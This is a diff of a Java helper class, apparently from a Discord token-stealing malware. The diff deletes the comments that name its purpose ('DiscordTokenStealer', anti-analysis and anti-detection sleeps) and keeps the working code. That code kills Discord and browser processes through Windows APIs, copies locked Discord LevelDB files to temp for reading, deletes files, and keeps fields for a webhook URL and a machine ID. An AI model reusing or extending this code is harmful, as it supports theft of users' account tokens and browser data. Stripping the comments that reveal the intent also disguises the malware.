@@ -1,4 +1,4 @@
-import com.sun.jna.platform.win32.Kernel32;
+﻿import com.sun.jna.platform.win32.Kernel32;
 import com.sun.jna.platform.win32.Tlhelp32;
 import com.sun.jna.platform.win32.WinDef;
 import java.io.File;
@@ -10,48 +10,23 @@ import java.util.Set;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
-/**
- * Process management and file utilities.
- * Obfuscated name: \u04dd
- *
- * Responsibilities:
- *  1. Kill Discord processes by name (using Windows Kernel32 API via JNA)
- *  2. File copy/delete utilities
- *  3. Random sleep (anti-analysis)
- *  4. Long path normalization (via Windows NtDll)
- *
- * Used by DiscordTokenStealer to kill Discord before/after injection.
- */
 public class ProcessKiller {
 
-    // Thread pool for async operations
     public static final ExecutorService executor = Executors.newCachedThreadPool();
 
-    // Webhook URL (set at runtime from EntryPoint)
     public static final String webhookUrl;
 
-    // Machine ID (derived from network interfaces + MAC address hash)
     public static final String machineId;
 
-    // Process name sets for killing
-    private static final Set<String> discordProcessNames;   // discord.exe, discordcanary.exe, etc.
-    private static final Set<String> browserProcessNames;   // chrome.exe, brave.exe, etc.
+    private static final Set<String> discordProcessNames;
+    private static final Set<String> browserProcessNames;
 
-    // Whether we're in "silent" mode (no console output)
     private static boolean silent;
 
-    /**
-     * Normalizes a Windows long path.
-     * Uses NtDll UNICODE_STRING structure to convert short paths to long paths.
-     * Calls Windows API: NtQueryObject / RtlNtPathNameToDosPathName
-     *
-     * @param path The path to normalize
-     * @return Normalized long path, or original if normalization fails
-     */
     public static String normalizePath(String path) {
         if (path == null) return null;
         try {
-            // Uses \u04cc.\u00ff (NtDll wrapper) to call GetLongPathName
+
             char[] buffer = new char[32768];
             int len = NtDllWrapper.getLongPathName(path, buffer, buffer.length);
             if (len > 0) return new String(buffer, 0, len);
@@ -59,19 +34,6 @@ public class ProcessKiller {
         return path;
     }
 
-    /**
-     * Kills all processes matching the given name set.
-     * Uses Windows Kernel32 API:
-     *   CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
-     *   Process32First / Process32Next
-     *   OpenProcess(PROCESS_TERMINATE, false, pid)
-     *   TerminateProcess(handle, 0)
-     *   CloseHandle(handle)
-     *
-     * Retries up to 3 times with random sleep between attempts.
-     *
-     * @param processNames Set of process names to kill (lowercase, e.g. "discord.exe")
-     */
     public static void killProcesses(Set<String> processNames) {
         for (int attempt = 0; attempt < 3; attempt++) {
             int killed = 0;
@@ -106,31 +68,18 @@ public class ProcessKiller {
 
             if (killed == 0) break;
 
-            // Random sleep between kill attempts (anti-detection)
             randomSleep(500, 1500);
         }
     }
 
-    /**
-     * Kills Discord processes.
-     * Process names: discord.exe, discordcanary.exe, discordptb.exe, discorddev.exe
-     */
     public static void killDiscord() {
         killProcesses(discordProcessNames);
     }
 
-    /**
-     * Kills browser processes.
-     * Process names: chrome.exe, brave.exe, opera.exe, msedge.exe, yandex.exe
-     */
     public static void killBrowsers() {
         killProcesses(browserProcessNames);
     }
 
-    /**
-     * Sleeps for a random duration between min and max milliseconds.
-     * Used to avoid timing-based detection.
-     */
     public static void randomSleep(long minMs, long maxMs) {
         try {
             long duration = minMs + (long)(Math.random() * (maxMs - minMs));
@@ -138,14 +87,6 @@ public class ProcessKiller {
         } catch (Exception ignored) {}
     }
 
-    /**
-     * Copies a file to a temp location with retry logic.
-     * Retries up to 5 times with sleep between attempts.
-     * Used to copy locked files (e.g. Discord's LevelDB files).
-     *
-     * @param source Source file to copy
-     * @return Temp file copy, or throws IOException after 5 failures
-     */
     public static File copyToTemp(File source) throws IOException {
         File temp = Files.createTempFile("tmp_", ".tmp", new FileAttribute[0]).toFile();
         temp.deleteOnExit();
@@ -162,11 +103,6 @@ public class ProcessKiller {
         return temp;
     }
 
-    /**
-     * Deletes a file or directory recursively.
-     * If file is a directory, deletes all contents first.
-     * If delete fails, schedules deleteOnExit.
-     */
     public static void deleteRecursive(File file) {
         if (file == null || !file.exists()) return;
         if (file.isDirectory()) {
@@ -179,7 +115,7 @@ public class ProcessKiller {
     }
 
     static {
-        // Initialize process name sets (decoded from obfuscated string table b[])
+
         discordProcessNames = new java.util.HashSet<>();
         discordProcessNames.add("discord.exe");
         discordProcessNames.add("discordcanary.exe");
@@ -193,7 +129,6 @@ public class ProcessKiller {
         browserProcessNames.add("msedge.exe");
         browserProcessNames.add("yandexbrowser.exe");
 
-        // webhookUrl and machineId are set at runtime
         webhookUrl = null;
         machineId = null;
     }
